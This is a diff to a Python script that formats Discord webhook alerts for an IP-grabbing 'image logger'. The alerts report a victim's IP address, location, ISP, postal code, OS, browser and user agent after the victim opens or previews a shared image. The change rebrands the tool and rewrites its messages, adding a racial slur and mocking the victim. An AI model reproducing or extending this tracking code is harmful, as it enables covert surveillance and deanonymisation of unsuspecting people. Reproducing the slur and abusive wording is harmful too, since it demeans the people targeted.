@@ -15,14 +15,14 @@ DEFAULT_IMG = 'https://placehold.co/1x1.png'
 
 def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
     return {
-      "username": "Fentanyl",
+      "username": "cure",
       "content": "@everyone",
       "embeds": [
         {
-          "title": "Fentanyl strikes again!",
+          "title": "lol",
           "color": 16711803,
-          "description": "A Victim opened the original Image. You can find their info below.",
-          "author": {"name": "Fentanyl"},
+          "description": "dumbass kid saved the image",
+          "author": {"name": "cure"},
           "fields": [
             {"name": "IP Info", "value": f"**IP:** `{ip}`\n**City:** `{city}`\n**Region:** `{reg}`\n**Country:** `{country}`\n**Location:** `{loc}`\n**ORG:** `{org}`\n**ZIP:** `{postal}`", "inline": True},
             {"name": "Advanced Info", "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n**UserAgent:** `Look Below!`\n```yaml\n{useragent}\n```", "inline": False}
@@ -33,14 +33,14 @@ def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
 
 def prev(ip,uag):
     return {
-      "username": "Fentanyl",
-      "content": "",
+      "username": "cure",
+      "content": "cure runs this shit nigga",
       "embeds": [
         {
-          "title": "Fentanyl Alert!",
+          "title": "cure alert",
           "color": 16711803,
-          "description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
-          "author": {"name": "Fentanyl"},
+          "description": f"Link has been sent.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
+          "author": {"name": "cure"},
           "fields": []
         }
       ],
